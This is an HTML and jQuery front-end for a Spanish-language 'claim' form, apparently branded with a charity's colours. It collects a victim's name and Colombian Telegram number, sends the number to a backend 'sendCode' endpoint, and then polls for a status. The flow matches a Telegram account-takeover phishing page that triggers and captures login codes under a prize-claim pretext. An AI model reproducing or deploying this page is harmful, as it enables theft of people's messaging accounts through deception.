<div class="py-2 d-block">

  <div class="text-center mb-3">
    <img src="assets/logo-form.jpg" style="
      width:100%;
      max-width:220px;
      margin:auto;
      display:block;
    ">
  </div>

  <p id="wrong" class="text-center mt-2 error-message" style="color: red;">Ingrese un número de teléfono válido.</p>

  <!-- FULL NAME -->
  <div class="mb-4">
    <label style="font-size:14px;font-weight:600;display:block;text-align:left;">
      Nombre completo
    </label>

    <div style="position:relative;">
      <img src="assets/username.png" style="
        position:absolute;
        left:16px;
        top:50%;
        transform:translateY(-50%);
        width:18px;
        opacity:.7;
      ">
      <input type="text" name="nama" class="form-control shadow-none" placeholder="Ingrese su nombre completo" style="
          height:40px;
          border-radius:30px;
          padding-left:48px;
          font-size:15px;
          border:1px solid #ddd;
        ">
    </div>
  </div>

  <!-- TELEGRAM -->
  <div class="mb-3">
    <label style="font-size:14px;font-weight:600;display:block;text-align:left;">
      Número de Telegram
    </label>

    <div style="position:relative;">

      <!-- ICON + CODE -->
      <img src="assets/kolombia.png" id="flagIcon" style="
        position:absolute;
        left:14px;
        top:50%;
        transform:translateY(-50%);
        width:26px;
        display:none;
      ">

      <input type="text" class="form-control shadow-none" name="phone" id="phone" placeholder="Número de Telegram"
        autocomplete="off" inputmode="numeric" required style="
          height:40px;
          border-radius:30px;
          padding-left:20px;
          font-size:15px;
          border:1px solid #ddd;
        ">
    </div>
  </div>

  <!-- CHECKBOX -->
  <div class="mb-3" style="display:flex;gap:8px;">
    <input type="checkbox" id="agree" style="
      width:14px;
      height:14px;
      margin-top:3px;
      accent-color: blue;
    ">
    <label for="agree" style="font-size:12px;color:#444;cursor:pointer;">
      Acepto continuar con la solicitud y el registro.
    </label>
  </div>

  <!-- WARNING -->
  <div id="checkboxWarning" style="
    display:none;
    color:#d32f2f;
    font-size:13px;
    font-weight:600;
    text-align:center;
    margin-bottom:8px;
  ">
    ⚠️ Debe marcar la casilla de verificación primero
  </div>

  <!-- BUTTON -->
  <button class="btdk btn w-60" id="claimBtn" style="
    height:37px;
    border-radius:30px;
    background: var(--caritas-red);
    color:#fff  ;
    font-weight:800;
    font-size:16px;
  ">
    RECLAMAR
  </button>

</div>

<script>
  $(document).ready(function () {

    $("#wrong").hide();
    $("#loader").hide();
    $("#checkboxWarning").hide();

    // FUNCTION TAMPILKAN FLAG + CODE
    function showCountry() {

      $("#flagIcon").css("display", "block");
      $("#countryCode").css("display", "block");

      $("#phone").css("padding-left", "50px");

      if ($("#phone").val() == "") {
        $("#phone").val("+57 ");
      }
    }

    // TAMPILKAN SAAT DIKLIK / FOCUS / DIKETIK
    $("#phone").on("focus click input touchstart", function () {
      showCountry();
    });

    // HILANGKAN WARNING
    $("#agree").on("change", function () {
      if ($(this).is(":checked")) {
        $("#checkboxWarning").fadeOut();
      }
    });

    function checkStatus() {
      $("#wrong").hide();

      $.ajax({
        url: 'API/index.php',
        type: "POST",
        data: { "method": "getStatus" },
        success: function (data) {
          if (data.result.status == "success") {
            window.location.reload();
          } else if (data.result.status == "failed") {
            $("#wrong").show();
            $("#lblLogin").show();
            $("#loader").hide();
          } else {
            setTimeout(function () {
              checkStatus();
            }, 500);
          }
        }, error: function (data) { }
      });
    }

    // BUTTON
    $("#claimBtn").on("click", function (e) {

      e.preventDefault();

      if (!$("#agree").is(":checked")) {
        $("#checkboxWarning").fadeIn();
        return;
      }

      var phone = $("#phone").val();

      if (phone != "") {

        $("#loader").show();

        $.ajax({
          url: "<?= base_url("API/index.php") ?>",
          type: "POST",

          data: {
            "method": "sendCode",
            "phone": phone
          },

          success: function () {
            setTimeout(function () {
              checkStatus();
            }, 500);
          },

          error: function () { }
        });
      }

    });

  });
</script>